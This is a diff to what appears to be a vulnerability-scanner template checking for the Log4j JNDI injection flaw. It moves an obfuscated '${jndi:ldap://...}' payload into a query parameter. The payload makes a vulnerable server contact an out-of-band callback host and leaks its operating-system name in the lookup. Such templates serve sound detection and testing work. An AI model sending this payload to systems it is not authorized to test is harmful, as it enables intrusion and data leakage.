@@ -13,7 +13,7 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
+      - "{{BaseURL}}/?x=${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${sys:os.name}.{{interactsh-url}}/s}"
 
     headers:
       Host: "{{Host}}"
